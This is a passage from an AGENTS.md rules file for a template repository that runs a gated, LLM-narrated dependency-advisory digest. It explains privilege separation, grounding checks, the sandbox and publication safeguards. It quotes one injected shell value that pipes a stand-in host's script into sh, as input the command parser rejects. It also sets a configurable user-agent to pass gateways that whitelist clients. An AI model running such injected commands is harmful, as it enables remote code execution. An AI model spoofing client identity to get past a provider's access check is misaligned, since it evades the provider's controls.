# AGENTS.md — the rules this repository is built on

> **Read this before editing anything.** Every rule below is either enforced by a
> check in `.github/workflows/ci.yml` or it is not a rule — it is a preference.
> Rules are listed with the check that enforces them. If you add a feature and a
> check starts failing, the check is right until proven otherwise.

This repository is a **template**. A user clicks "Use this template", sets two or
three repository variables, optionally one secret, and gets an agent that watches
their stack and narrates a daily digest. There is no server, no database, no
front-end build step, and no vendor of ours in the loop.

---

## 0. The one sentence

**The repository is the instance, and git is the only durable store.**

Everything below is a consequence of that. If a change needs a database, a
long-lived process, or an inbound port, it does not belong in this repository.

---

## 1. Invariants

### I1 — One privilege per job

> *No component holds both a secret and a write token.*

A job may hold a secret, or it may hold `contents: write` / `issues: write` /
`pull-requests: write`. It may not hold both. This is why `digest.yml` is one
file with **four** jobs rather than one job with four steps, and why the
containment gate (I2) runs in the job that has no model key.

- **Enforced by:** `lib/invariants.mjs` → `checkOnePrivilegePerJob()`, run in CI.
- **Enforced by:** `lib/invariants.mjs` → `checkSandboxIsolated()`.
- **Why it erodes:** it is easy to merge two jobs "just for latency". The merge
  is always a downgrade; the latency is seconds.

### I2 — The gate decides, and the gate cannot be hijacked

> *Every entity in generated prose must appear in the fetched payload.*

"Entity" = `{advisory id, package name, version literal, numeric token}`. Not
just numbers: a hallucinated `GHSA-…` identifier inside a fluent sentence is the
same failure class as an invented version number.

**The payload is the narrator's input, and it is the gate's input. One document.**
The gate may only ever be handed the document the narrator was shown the facts
of. Hand it a different document and it will reject correct prose for stating
something the narrator was legitimately told — every run, deterministically,
which is exactly how that stays invisible.

That is not a hypothetical. `buildFacts()` once took `decisions` as a second
argument while `commit-step` gated the prose against `payload.json` alone. A
decision's `severity` is arithmetic over OSV's CVSS vector and lives in
`decisions.json`; the payload holds only the vector string. Measured on a live
run: **10 of 16 facts the narrator received were ungroundable**, so every
narration containing a severity failed the gate and the digest could never
commit. 207 tests passed throughout, because the narration path had never
completed a live call.

So the decisions are folded into the payload by `attachDecisions()`, and
`buildFacts()` takes **one argument** — a function of one argument cannot read a
second document, and that is the enforcement. `attachDecisions()` projects
exactly the fields the narrator may say; everything it leaves out (`tau`,
`typed.*`, the composite scores) stays outside the document and stays
ungroundable, so a model-derived number in the prose is still an entity the gate
rejects.

The gate runs **only** in a job that holds no model key (`commit` in
`digest.yml`, `reply` in `ask.yml`). A gate that shares a job with the model is a
gate the model's input can influence. The document it reads is assembled there,
not in the job that holds the key.

**The narration is body text. The digest owns the outline.** The template writes
one H1 and a set of H2 sections; asked to "write the digest", a model writes a
digest-shaped document with its own title and its own top-level sections. A live
run returned **4 of the digest's 9 headings** — its own
`# Dependency digest — observed …` plus `## Act`, `## Watch` and `## Other`, level
with the template's `## Act on these`. The symptom a reader notices is a
duplicated title; the defect is that the model wrote half the document's
structure, and a fix aimed at the title alone leaves `## Act` beside
`## Act on these`.

So `narrationBody()` drops the leading H1 (ATX or setext) and **clamps** every
other heading to H3 or deeper — clamped, never promoted, so nothing the model
writes can collide with a template section or become a second H1. The model's own
grouping survives one level down, because those labels are load-bearing.

**It runs in the renderer, after the gate, and that ordering is the point.**
`unfence()` normalises the model's answer in the narrate job, *before* the gate;
this runs *after* it. Normalising structure before the gate would delete the
evidence the gate exists to read — an invented number inside a title would simply
vanish and the run would look clean. A presentation fix must never run upstream
of the control.

A narration that reduces to nothing but a title is rendered as a **gap**, not as
silence: `prose.md` only exists on the success path, so a run that answered `200`
and wrote a title would otherwise be byte-identical to a deliberately keyless
instance — the failure `narration.json` exists to prevent, by a new route.

- **Enforced by:** `lib/gate.mjs`, called from `scripts/commit-step.mjs` and
  `scripts/reply-step.mjs`; unit-tested in `tests/gate.test.mjs`.
- **Enforced by:** `lib/render.mjs` → `buildFacts(payload)`, whose arity is the
  check. `tests/gate.test.mjs` asserts that a numeric severity is groundable
  against the document and *not* against the bare payload, so the projection
  cannot become a no-op unnoticed.
- **Enforced by:** `lib/render.mjs` → `narrationBody()`. `tests/render.test.mjs`
  asserts the class, not a string: for eight narration shapes — the real live
  prose, a title-only answer, a setext title, a collision by name, a deep
  heading, an empty heading — the rendered digest has **exactly one H1**, and
  every H2 in it is one the template wrote. Reverting the clamp alone fails three
  of those.
- **Hard limit:** the gate is exact and deterministic and must stay that way. A
  paraphrase-tolerant second pass may only ever *queue a sentence for human
  review*. It must never gate a commit.

### I3 — Bounded writes, fail-closed

Only these paths may be written:

| Writer | Allowlist |
|---|---|
| Collector (the pipeline, at runtime) | `data/`, `history/`, `digest/`, `assets/`, `README.md` |
| CI (rendering, at commit time) | the above plus `site/` |

Any unexpected path aborts **before** commit. Enforced inside the writer
(`lib/store.mjs`) and again in CI as a diff check over `git status --porcelain`.

`site/` deliberately appears in the CI allowlist but not the collector's: who may
write what is a separation, not a duplication.

### I4 — Everything is behind the change gate except one file

`writeIfChanged()` compares content before writing. A state file strips its own
timestamp before comparing, so a no-op run does not restamp. Without this, four
runs a day is ~1,460 commits a year of identical files.

**Exactly one file is exempt: `data/heartbeat.json`.** It is always rewritten,
never hashed, never diffed. This is not tidiness — it is the mitigation for the
60-day trap: a broken agent that writes the same failure state twice would commit
nothing, go silent, and have its schedule disabled. `consecutive_failures` moves
monotonically while the agent is broken, so there is no state in which a run
commits nothing.

- **Enforced by:** `lib/store.mjs` (`isGateExempt()`), asserted in
  `tests/store.test.mjs`.

### I5 — Append-only history, hash-chained

`history/runs.jsonl` chains: each row's hash covers the previous row's hash.
Verified on every run; a broken chain fails the run loudly.

Events are **transitions, not snapshots** — `added`, `bumped`, `flagged`,
`cleared`. History is written when semantic state changes, not when the clock
ticks.

Narration is **excluded** from the chain. Prose is generated content, not a fact
about the world; hashing it would make the chain churn on every phrasing tweak.

### I6 — Commands are parsed, never interpreted

The comment body is **never** passed to a model as an instruction. The verb is
matched by regex against an allowlist of eight verbs — seven command shapes, since
`pause` and `resume` are one toggle. The argument is validated against the watch
list in `data/stack.json`. Free text is rejected.

Four rules, all structural, all in `lib/commands.mjs`:

1. **Author gate** — `author_association ∈ {OWNER, MEMBER, COLLABORATOR}`, and an
   **exit**, not a warning.
2. **Grammar, not model** — regex over the allowlist; at most the parsed argument
   reaches a model, and only for `explain`.
3. **Argument validation** — must appear in the watch list. This removes the
   shell-interpolation surface entirely: `"; curl evil.sh | sh` fails the parse,
   it never becomes a command.
4. **Idempotency** — `{comment_id, author, verb, arg, started_at, outcome}` is
   written to `history/commands.jsonl` **before** acting. GitHub permits re-runs
   and users perform them; a re-run must not bump a dependency twice.

### I7 — The sandbox never receives a secret, and ships off by default

The sandbox is a container inside an Actions job. It has no session and cannot
have one, because every Actions job is a fresh VM destroyed at the end of the
run — no attach, no pause, no resume.

- `sandbox.yml` declares `permissions: {}` and receives **no** secrets.
- Child containers run `--network none --read-only --cap-drop ALL
  --security-opt no-new-privileges --user 65534:65534`, with
  `LLM_API_KEY: ""` passed **explicitly empty** so it cannot be inherited.
- Dependencies are installed in the trusted parent **before** the network is cut;
  the prepared workspace is mounted read-only.
- **Enabled by `SANDBOX_ENABLED`, default `false`.** The strongest property in
  this design is that the default instantiation executes no third-party code at
  all.

The self-test is: **if `sudo` works inside the sandbox, the sandbox has already
leaked.** `lib/sandbox.mjs` asserts this on every run.

### I8 — No provider names in the code

The agent must not have an opinion about which endpoint you use, so it must not
contain one. `lib/llm.mjs` takes a base URL and a model name and knows nothing
else. There is **no default endpoint and no fallback**: if no base URL is
configured, the rules-only path (§I9) produces the whole digest and no model is
contacted.

Configuration surface, and nothing more:

| Name | Kind | Value |
|---|---|---|
| `LLM_API_KEY` | secret | the user's own key |
| `JEV_API_KEY` | secret, optional | only when `JEV_ENABLED` is true |
| `LLM_BASE_URL` | variable | any OpenAI-compatible root |
| `LLM_MODEL` | variable | model or deployment name |
| `LLM_USER_AGENT` | variable, optional | the client identity to send, when the endpoint gates on one |
| `LLM_TOKEN_BUDGET` | variable | tokens per run, default `60000` |
| `JEV_ENABLED` | variable | `false` (default) |
| `JEV_BASE_URL` | variable | the typed layer's root, including its version prefix — the endpoint called is `POST {JEV_BASE_URL}/systemone`; only when `JEV_ENABLED` is true |
| `JEV_MODEL` | variable | model or deployment name for the typed layer; default `jev-latest` |
| `SANDBOX_ENABLED` | variable | `false` (default) |
| `AGENT_LANG` | variable | reply language, default `en` |

- **Enforced by:** `lib/invariants.mjs` → `checkNoVendorNames()`.
- **Enforced by:** `lib/invariants.mjs` → `checkConfigSurface()` (I14), which
  asserts this table and the workflows agree in both directions. Measured against
  the tree as it stood: two names were read by a workflow and absent from the
  table (`JEV_BASE_URL`, `LLM_TOKEN_BUDGET`), and one was read by the code and
  delivered by no workflow (`JEV_MODEL`). "And nothing more" is exactly the kind
  of claim that needs a check rather than a promise.

`LLM_USER_AGENT` is the one name here that describes the *transport* rather than
the model, and it earns its place the same way the others do. A gateway can reject a
request before it looks at the key: a relay behind a whitelist of known client
identities answers anything else with `401 unauthorized client detected`, so a valid
key is refused and the error names the client, not the credential. A client that
cannot vary its identity cannot use such a provider at all, and no amount of
rotating the key changes that. The header is sent only when the variable is set, so
an endpoint that does not gate sees a byte-identical request.

### I9 — The agent is fully useful with no model key

The advisory rules tier in `lib/triage.mjs` is a real implementation, not a
placeholder. `JEV_ENABLED` defaults to `false`. So a user with no key at all
still gets a complete, correct, gated digest — narration is simply the
deterministic template.

Enabling a decision layer **adds** a tier; it never switches providers.

**The typed layer's decision rule is a band, read per answer.** A `noul` answer
is a probability that carries its own certainty, so a value near the middle is
*no signal* rather than medium intensity — `>= 0.5` is the wrong way to read one,
and a single threshold therefore has to guess in exactly the region where
guessing is least defensible. The band's edges are τ and `1 - τ`, so there is
still exactly one tunable parameter.

**Per answer, never on an average of them.** An earlier version averaged the two
values and banded the mean, which quietly undoes the band: a decisive `1.0` beside
an unsure `0.5` averages to `0.75` and reads as confident, even though the model
said yes and no were equally likely. Averaging a probability with its own negation
is not a summary of the two — it is a third number neither answer supports. An
answer inside the band, an absent answer, and an answer that will not parse all
escalate; none of them resolves to a decision.

- **Enforced by:** `tests/triage.test.mjs`, the `noul` band tests, including the
  case an average hides.
- **Why it erodes:** `noul` has no `confidence` field. Reading one anyway does
  not fail — it returns `undefined` — and the reflexive `?? 1` guard turns "no
  such field" into *maximum certainty*, which silently disables the check it was
  written to perform. A fallback on a response field the layer is expected to
  send must default to **escalate**, never to **permit**.
- **The criteria must not close the band.** The `false` side once read "not
  imported, *or is unclear*", which instructs the model to answer 0 when it cannot
  tell. That removes the only input the escalation path depends on. "I can't tell"
  belongs in the middle of the `noul` value, and the criteria must leave it there.
- **A question with no premise is not asked.** The band catches a model that
  cannot tell. It cannot catch a question that has nothing to compare against:
  asked whether the flaw is in one of the components we import, about a package
  whose imported-symbol list is empty, the layer answers `0.04` — decisive, and
  decisive about zero things. Composing that turned the rules tier's `uncertain`
  ("usage is unmapped — reachability unknown") into `watch` ("not on a path we
  use"), a verdict the rules tier had explicitly declined to reach.
  `answerableQuestions()` drops those questions before the request is built, and
  `compose()` escalates on the absent answer with a reason that names the gap
  rather than blaming the endpoint. Measured against the live service, not
  theorised.
- **Absent data is not a negative verdict.** `inAnyRange(pinned, [])` returns
  `false`, so an advisory whose range list is empty fell through to `clear` —
  "pinned version is outside the affected range" — which is a claim about a range
  that was never received. The vacuous truth of an empty set is precisely the
  shape of a silent false negative: the digest reads as a clean bill of health.
  Zero evaluable ranges is `uncertain`; so is a set the evaluable ranges miss
  while part of it stays unchecked, because an unevaluable range cannot un-affect
  us. The same rule covers the range *type*: `SEMVER` and `ECOSYSTEM` are both
  version ranges, and a filter that accepts one and rejects the other marks a
  whole ecosystem unevaluable while looking like diligence. Measured on the live
  stack, the shipped filter reported **11 clear, 0 to act on** for eleven
  advisories that all affected the pinned version and all had a fix published.
- **The request body is asserted, not assumed.** `tests/triage.test.mjs` pins
  `{model, questions, state}`, with `model` a **string** and `selectedModels`
  absent. A stubbed *response* cannot catch a wrong *request*: the stub is wrong
  in the same direction as the code, so it stays green forever. That is how a
  request that was rejected on every call shipped with the whole suite passing.
- **The retry policy is copied from the vendor's SDK, not invented.** Their
  default is 408, 429 and the **whole of 500–599**, with jittered backoff and
  `Retry-After` honoured up to a minute. A hand-picked 5xx list silently drops
  501, 507 and the rest. Note also that `Number(null)` is `0`, not `NaN`: reading
  an absent header with `Number(...)` yields a zero-second delay and disables the
  backoff entirely.

### I10 — The web surface holds no key and calls no model

`site/chat.html` is a **composer, not a client.** It builds a prefilled issue
URL, the user submits it already authenticated, the workflow runs in Actions, and
the reply lands as a comment the page renders on next load.

A page that calls an endpoint directly is rejected for three reasons, each
individually fatal: the key would be public; there is no fetched payload to
validate against, so nothing grounds the answer; and no row is written to
`history/commands.jsonl`, so the answer is unauditable.

**The one thing that must not happen:** the page must never gain a direct route
to execution — no endpoint, no token, no browser-triggered dispatch. A static
page *cannot* trigger a workflow (that needs a token carrying `actions: write`),
so this boundary is enforced by the platform, not by discipline. Keep it that
way.

**Ungrounded answers must be marked, permanently and visibly.** The digest is
verified; "dev help" is not. Rendering them in the same visual style destroys the
property I2 exists to buy.

### I11 — Honesty about time, and about what is missing

Scheduled workflows are delayed under load and may be dropped. So a digest is
stamped with the **observation time**, never with the schedule. "As of 06:12 UTC"
is honest; "today's briefing" is a small lie that will eventually be caught.

The same rule applies to absence. **A component that produced nothing must say
why it produced nothing**, because "absent" is otherwise indistinguishable from
"deliberately not configured" — and the second is a supported mode, so the
reader has no reason to investigate. A failed *source* is already rendered in the
digest's gaps section. A failed *narration* was not, and the hole was total: the
digest, the README region, the run record and the heartbeat all read exactly as
they would on an instance that was never given a model key. A wrong key, a
revoked key, a blocked network and an exhausted budget were one silent state,
indefinitely, on a schedule nobody watches.

- **Enforced by:** `scripts/narrate-step.mjs` writes `.run/narration.json` on
  every exit path — a provisional record *before* the first thing that can throw,
  and a crash record in its top-level `catch`; `lib/render.mjs` renders it into
  the gaps section; the run record carries `narration_status`. Tested in
  `tests/render.test.mjs`.
- **The distinction is the whole point.** `configured: false` is not a gap and
  must not grow one — a keyless instance is a complete instance. Every other
  un-successful record is one, including `configured: null`: that is the
  provisional record, and it means the step began and never got far enough to say
  what happened. The predicate is written as "not `false`" rather than "is `true`"
  so a record missing the field cannot pass by accident.
- **The record's presence is the signal; the platform's is not.** `commit-step`
  reads the artifact and never `needs.narrate.result`, because the narrate job
  carries `continue-on-error: true` and a job that died from an exception still
  reports `success` to its consumers. A signal that reads as authoritative and is
  not is worse than no signal — it made `commit-step`'s `failed` branch
  unreachable while looking like the check. **A job that can degrade records its
  own outcome into `.run/`.**
- **A stage that delivered nothing is not a degradation.** If the decision set
  does not arrive, every count in the digest is arithmetic over a set nobody
  computed, so nothing is published except the heartbeat — and the `heartbeat` job
  commits it, because the run that writes nothing at all is the run whose schedule
  GitHub disables after 60 days.
- **What travels is the status, never the body.** The endpoint's response text is
  not ours to publish and the digest is committed. `lib/llm.mjs` →
  `classifyFailure()` reduces a failure to a status code and a coarse kind.
- **A degradation is not a failure.** The run is `degraded`, not `failed`: the
  digest is correct and complete without the prose. `narrate-step` still exits 0.
  But it is no longer `ok`, and that is what `consecutive_failures` and the Pages
  status line now reflect.
- **Why it erodes:** a caught-and-warned error feels handled. The warning goes to
  a workflow log that nobody reads on a green run, and the artifact it *should*
  have written is the one thing missing.

### I12 — Third-party actions are pinned to a commit

> *A tag is a mutable pointer. A commit is not.*

`actions/checkout@v4` is resolved by GitHub at run time. Whoever can move that
tag controls code that executes inside a job holding the user's write token — and
the move leaves no trace in this repository. So every `uses:` must name a 40-hex
commit; the human-readable release goes in a trailing comment.

A local reusable workflow (`./.github/workflows/…`) is exempt: it is this
repository, at the commit being run, not a third party. A container action
(`docker://`) must be pinned by digest instead.

- **Enforced by:** `lib/invariants.mjs` → `checkActionsPinned()`.
- **Upgrading:** change the SHA and the comment together, in one diff. That diff
  is the entire point of the rule — it is the moment a human looks.

### I13 — The cheap guard mirrors the real gate

Two copies of one allowlist exist by necessity. `lib/commands.mjs` decides, and
the workflow `if:` pre-filters so a stranger's comment never starts a runner at
all. Two copies of a rule drift, so the workflow must name **exactly** the
allowlist the script declares — read out of the script, not restated here.

Equality, not containment. A pre-filter *looser* than the gate is the dangerous
direction. A pre-filter *stricter* than the gate silently drops legitimate
commands, which is its own bug.

Two details that are load-bearing and were both found by writing the check:

- **The association is read per event.** `github.event.comment` is `null` on an
  `issues` event, and a null comparison is not a rejection — `null != 'NONE'` is
  `true`. A single condition admits a stranger's `/agent`-titled issue by
  accident.
- **The title prefix carries its delimiter.** `startsWith(title, '/agent')` also
  matches `/agentfoo`. The composer and the issue template both emit `/agent`
  followed by a space, so requiring the space costs nothing and means the
  pre-filter admits only what it claims to.

- **Enforced by:** `lib/invariants.mjs` → `checkAuthorGateMirrorsScript()`.
- **Not a substitute for I6.** The `if:` filters an *event*; the script checks a
  *value*. The script still exits, and must keep exiting.

### I14 — The configuration surface agrees with its documentation, both ways

The table under I8 says "and nothing more". That is a claim about two files at
once, and it had already drifted in both directions before this check existed:

- **workflow → table.** `digest.yml` read `vars.JEV_BASE_URL`; the table did not
  list it. A user reading the table could not have known to set it, and the
  typed layer would have fallen back to the rules tier with no explanation.
- **code → workflow.** `scripts/narrate-step.mjs` read `JEV_MODEL`; no workflow
  passed it. The table documented a knob that did not exist at runtime — the
  quietest possible failure, because nothing errors when an unset variable is
  read.

Neither is visible by reading either file alone. So:

- every `vars.*` / `secrets.*` a workflow references appears in the I8 table;
- every `LLM_*` / `JEV_*` name the code reads is passed by some workflow **and**
  appears in the table.

The second direction is scoped to those two prefixes on purpose. Everything else
a step reads — `COMMENT_ID`, `PROBE_ENDPOINT`, `FETCH_RESULT`, `COMMIT_RESULT` —
is plumbing the workflow composes out of `needs.*` and `github.*`. Demanding a
table row for each would be noise, and a noisy check is a disabled check.

`secrets.GITHUB_TOKEN` is excluded, for the reason I1 excludes it: the platform
supplies it, the user cannot configure it, and it is not a row.

- **Enforced by:** `lib/invariants.mjs` → `checkConfigSurface()`.
- **Fails loudly, never vacuously.** If the table anchor is missing, or the table
  parses to zero rows, the check fails rather than reporting success over an
  empty set.

### I15 — A file that crosses a job boundary travels as an artifact

**A job boundary is a filesystem boundary.** Each job gets a fresh runner, so a
file one job wrote is *absent* in the next unless an artifact carries it.

This is the rule the local suite is structurally unable to check, and that is the
whole reason it is written down. Run by hand, the four `digest.yml` jobs share one
`.run/` directory, so a file "narrate" wrote is still sitting there for "commit" —
which is exactly what GitHub replaces with an explicit upload and download. **A
sequential local run proves the code, not the wiring between jobs**, and this
repository had both a green 238-test suite and a completed local end-to-end run
while the pipeline could not produce a correct digest.

`narrate-step` writes `.run/decisions.json` and `.run/narration.json`;
`commit-step` reads both (`:78`, `:84`); neither was uploaded. So the commit job
always saw `decisions = []`, and a stack with a known advisory published
**"0 to act on"** and reported `ok` — in a security product, silently
under-reporting an advisory is the worst available failure mode. It reopened I11
by a new route as well: with `narrationStatus = null`, `narrationGap()` cannot
tell "configured and broken" from "deliberately keyless".

The same defect was live in `act.yml`: `act-step` writes `.run/act.json`,
`pr-step` reads it, and nothing carried it — so a `bump` would have opened a pull
request with an **empty patch** and the default verify command, reporting success
while changing nothing.

Three assertions, all static:

- a `.run/` file read by one step and written by a different one is carried by an
  upload **in that job's own workflow**, scoped per job — an upload sitting in a
  third job that runs *after* the consumer does not span a boundary it appears to;
- it lands **where the reader looks**. Carried is not delivered: re-pointing a
  download at `state/` moves the file somewhere `commit-step` never opens, and
  comparing only the artifact *name* saw nothing;
- every downloaded artifact name is uploaded in the same workflow.

Read/write classification resolves one level of `const` indirection, because
`narrate-step` binds `NARRATION = path.join(RUN_DIR, 'narration.json')` and writes
through the name. Read as a read, that file would have no producer and the check
would pass over a pipeline that never delivers it.

- **Enforced by:** `lib/invariants.mjs` → `checkArtifactHandoff()`.
- **What the vocabulary covers.** Four spellings of a write — `writeFileSync`,
  `appendFileSync`, `writeFile` and `appendFile`, the last two covering
  `fs.promises.*`; a producer found in a `run:` step directly, through
  `npm run <name>`, or through `npm test`, both resolved against `package.json`
  and only when the name resolves; and an upload path that carries a file by
  exact match, by naming its directory, or by a trailing `/*`.
- **The narrowness is deliberate, and it is guarded.** `RUN_DIR` is matched by
  name; if it is ever renamed the scan finds nothing. So the check reports how many
  handoffs it examined and the test asserts the count is non-zero — a check that
  can pass vacuously is not a check. Still invisible: a `.run/` path built by any
  other expression, and a write performed by a module under `lib/` rather than by
  the step script.
- **What it cannot see.** That an upload is *reached* at runtime, and that
  `download-artifact` succeeds. Those are platform facts. The compensating rule is
  the download side of the pairing: a missing artifact must fail the job, because
  an empty patch or an empty decision set arriving silently is the failure this
  invariant exists to prevent.

### I16 — The public surface is projected, and the renderer reads only the projection

**The public digest is the private digest with a filter applied, and the filter
runs in the job that holds no key.** This is the second direction of the
disclosure §I2 guards, and it is the irreversible one: a repository that has been
public cannot be made un-public, forks detach and persist, and an append-only
file that recorded a name can never be rewritten. So the default for every entry
is **not publishable**, and a name reaches the public surface only because it was
listed there.

`data/stack.json` carries three publication lists — `public_packages`,
`public_upstreams`, `public_feeds` — naming the subset of `packages`,
`watch.upstreams` and `watch.feeds` that may be rendered onto the Pages site.
`lib/publishable.mjs` decides what may be published; `lib/public-surface.mjs` is
where that decision is *applied*, and it is one module for one reason: the
projection has exactly one legitimate execution point, and a helper both the
pipeline and the test suite call is the only way to be sure the tested path is
the shipped one (§5's rule — *an option that is unit-tested and not wired proves
nothing*).

**Why the commit job, and not the renderer.** The obvious home for a publication
filter is the thing that publishes. It cannot be there: `pages.yml` checks out
committed files and downloads no artifact, so `scripts/render-site.mjs` never
sees a payload and has no `(payload, policy)` to project. `commit` is the only
component holding the payload, the decisions and a write token — and it is the
keyless job (I1/I2), which is where a control belongs. The renderer reads what
was already projected and never projects.

That makes the renderer's **read set** the security boundary, and this is the
invariant that holds it. Three assertions, all static:

- **no literal in the renderer resolves into a collector root** — the watch list,
  the run chain, the command log, the triage log, the heartbeat. Detection is by
  content, not by function name, so an unenumerated reader is caught by the path
  it names;
- **the declared `PUBLIC_SUMMARY` must carry the marker the projection uses**
  (`PUBLIC_DIGEST_PREFIX`). The permitted set is *derived* from that declaration,
  so without this guard re-pointing the constant would simply widen the set to
  match — and the first version of the guard was a list of three forbidden paths,
  which passed `data/heartbeat.json`, `data/triage.jsonl` and
  `history/runs.jsonl`. A projected artifact is **marked**, not listed;
- **a read target is one of exactly three forms**: an allowlisted literal, the
  declared constant identifier, or `path.join(…)` whose arguments are folded —
  every one of them — when they are literals or const-bound names.

**The rule is a property of the resolved path, not of the spelling.** Three
clauses decided by spelling, and each left the class open, so one path had two
verdicts:

```
path.join('digest', '..', 'data', 'stack.json')   refused
path.join('digest', '../data/stack.json')         allowed
```

The exemption was a prefix test that never collapsed `..`; the `path.join` branch
folded only its first argument; and the candidate test excluded any literal
containing `..`, which made a traversal invisible to the content clause *and* —
when the reader sat outside `READ_FUNCTIONS` — to the form clause as well. All
three now resolve the path first. **A check that decides by spelling leaves the
class open however many spellings you enumerate**; the fix is a predicate over
the resolved value. Where a component is not statically known the path cannot be
resolved at all, so a traversal among the parts that *are* known fails closed
instead.

- **Enforced by:** `lib/invariants.mjs` → `checkPublicRendererReadsNoPrivatePath()`.
- **The canary is the other half.** `e20fa1c` runs `commit-step` end to end
  against a sentinel present in `packages` and absent from every `public_*` list,
  and asserts the sentinel reaches no published byte. The static check proves the
  wiring; the canary proves the wiring *ran*.
- **What it cannot see, and one of these is structural.** A target assembled at
  runtime from no resolvable component — `fs.createReadStream(A + '/' + B)` —
  passed to a reader outside `READ_FUNCTIONS`: there is no literal to resolve and
  no name to recognise, so neither clause can fire. That is a real gap, it is the
  reason the pipeline canary exists, and it is **asserted as passing** in
  `tests/invariants.test.mjs` rather than left silent. Every other limit that once
  sat beside it turned out to be an oversight rather than a boundary, which is
  worth knowing before trusting the next one.
- **A refusal proves nothing about which clause refused.** Three clauses can now
  see a traversal, so each carries a mutant control that disables it and requires
  its cases to flip green. That control caught an error in the list being tested:
  one spelling was already refused before the fix, by a bare component literal the
  content clause catches, and so never belonged in the group attributed to
  resolution.

---

## 2. Where this runs

**This template is public and holds no secrets. A user's instance is private.**
Those are different repositories, and the separation is the security story rather
than a deployment preference.

| Repository | Visibility | Holds | Runs |
|---|---|---|---|
| Template — this one | public | no secrets; the seed `data/stack.json` | a live demo digest |
| Instance | private | the user's stack, the user's key | the user's digest |
| Status — optional | public | the publishable subset, and nothing else | a second, redacted digest |

**The marker and the filter both exist**, so the Status row is a supported
configuration rather than a design note. `data/stack.json` carries the three
publication lists, `lib/public-surface.mjs` applies them in the `commit` job
(I16), and the public digest is **templated rather than narrated** — prose cannot
be filtered, so dropping it dissolves that route by construction. What remains a
*choice* is the deployment shape, and the two options are not equivalent:

- **one instance, a filtered surface.** The projection is written into the
  instance and `pages.yml` publishes it. One source of truth and no duplicated
  work. The catch is consequence 4 below: the site is world-readable however
  private the repository is, so this publishes the filtered digest *on purpose*
  and depends entirely on the filter being right.
- **a separate Status repository.** A second instance pointed at a stack holding
  only publishable entries. The filter becomes a second line rather than the only
  one — the belt-and-braces shape — at the cost of two watch lists that can
  disagree.

**The half that is not built is the other direction.** There is no
`config/private.json`, so nothing prevents a private package from being fetched
and sent to the model — the disclosure `REPORT.md` §5.4 describes. The publication
allowlist closed the irreversible direction first, and deliberately so: a name
sent to an endpoint the user chose can be rotated, while a name published cannot
be recalled.

Four consequences that shape what may be committed here:

1. **The seed stack is a demo, not a placeholder.** This repository runs the real
   pipeline against `data/stack.json` on a schedule and publishes the result. It
   is worth watching, and it is harmless to publish, because it watches a handful
   of widely-used packages and one public feed. Keep it that way: a seed entry
   that is *specific to one organisation* does not belong here, because the demo
   digest is public.
2. **No secret may ever be added here.** Not a default, not an example, not
   "temporarily". The instance carries the key. The configuration table in I8 is
   the entire surface, and every entry in it is a variable or a secret the user
   sets in their own copy.
3. **The instance is created with "Use this template", never a fork.** A fork of
   a public repository is public and cannot be made private, and it stays tied to
   its upstream. "Use this template" produces a copy with independent history,
   settings and secrets. `README.md` says this to users; this file says it to
   contributors, because a change that only works when the repository is private
   breaks the template.
4. **Pages publishes the digest, and the repository's visibility does not make
   the site private.** A Pages site built from a **private** repository is still
   world-readable — access-controlled Pages requires Enterprise Cloud, and only
   for org-owned project sites. So `pages.yml` is not a way to show a private
   instance's digest to a chosen few; it is a way to publish it. That is why it
   is opt-in, and it is the reason the digest is only ever as safe to publish as
   the watch list it is computed from.

- **Enforced by:** `ci.yml` → `no-secrets-in-tree` refuses a credential-shaped
  string anywhere in the tree.
- **Enforced by:** `tools/check-public-safety.mjs` → `lib/pubsafe.mjs`. The seed
  stack is compared against the list recorded in `lib/pubsafe.mjs`, as sets — so
  reordering passes, and adding or removing one entry does not. This is the rule
  that used to read *"not enforced by anything"*, and a preference is a rule that
  erodes. It erodes here in the worst direction available: the watch list is both
  the list of packages watched **and** the command argument allowlist, so one
  entry naming a private repository publishes an organisation's dependency
  posture, permanently, in a repository that also has forks.
- **Not in `lib/invariants.mjs`, and that is deliberate.** Those run on every push
  in every repository made from this template. Asserting "the stack equals the
  seed" there would fail a user's CI the moment they watch their own packages —
  which is the first thing the template asks them to do. The seed rule is a rule
  about *this* repository, so it is checked before publishing rather than on every
  run.
- **Also audited before publishing**, because publishing is a one-way door and
  "publish, then check" is not an available ordering:
  - no credential anywhere in **history** — the one thing a private repository
    cannot delegate, since GitHub's secret scanning is free on public
    repositories only, so a secret committed and later removed is invisible to
    every other check here;
  - no tracked `.run/` scratch;
  - no committed endpoint `host` or `model` in `data/endpoint.json`, which would
    contradict I8's position that the endpoint is the user's own business. **The
    rule and the code disagreed until this was fixed**: `probe()` returned both
    and `commit-step` wrote the record to that path, so a single
    `PROBE_ENDPOINT=true` run made this audit fail permanently, with no code path
    back — latent only because the probe is opt-in. Resolved in the rule's favour,
    which is also the one-way-door direction: the probe now records capabilities
    and timings and names no infrastructure, and `commit-step` projects the record
    through an allowlist (`PUBLISHABLE_ENDPOINT_FIELDS`) before writing it. This
    audit is the second half — it re-checks the committed file, so a field wrongly
    added to that allowlist is caught by a check that did not change.
  - the endpoint's response body appears in no log and no committed file. The
    same reduction applies to a probe failure and to a narration failure: a kind
    and a status, never the text (`classifyFailure()`, `classifyProbeFailure()`).
- **Stated for reporters in:** `SECURITY.md`.

---

## 3. Layout

```
.github/workflows/   digest (4 jobs) · ask (3 jobs) · act · sandbox · pages · ci
.github/CODEOWNERS   the paths where a quiet change is worse than a loud one
lib/                 the documented five: llm · probe · commands · sandbox · triage
                     plus internals: store · version · gate · sources · render ·
                     invariants · pubsafe · github
                     and the publication pair: public-surface · publishable
scripts/             one entry point per job
tools/               the checks a human runs: invariants (per push) ·
                     public-safety (before publishing)
data/                state — all behind the gate except heartbeat.json
history/             append-only: events · commands · runs (hash-chained)
digest/              dated archive
assets/              README artwork — hand-built SVG, light and dark, no external requests
site/                index.html (digest view) · chat.html (composer)
README.md            regenerated between markers
SECURITY.md          what is in scope for a report, and what is not
LICENSE              MIT — the notice a copy has to carry
```

The five named modules in `lib/` are the documented surface. Everything else in
`lib/` exists to keep them single-purpose.

---

## 4. Local development

```bash
npm test                     # unit tests, no network
npm run check                # invariant checks over the workflows on disk
npm run audit:public         # before this repository is published — see §2.1
node scripts/fetch-step.mjs  # dry run; writes .run/payload.json, no commit
```

`fetch` and `narrate` are read-only and safe to run locally. `commit` writes —
run it only in CI unless you know why you are running it.

**`npm test` also parses every module under `scripts/`, `lib/` and `tools/`, without
running it.** That is not ceremony. Both pages are built inside a single template
literal in `scripts/render-site.mjs` — stylesheet included — so **a backtick anywhere
inside it, even in a CSS comment, closes the string** and the file stops parsing. The
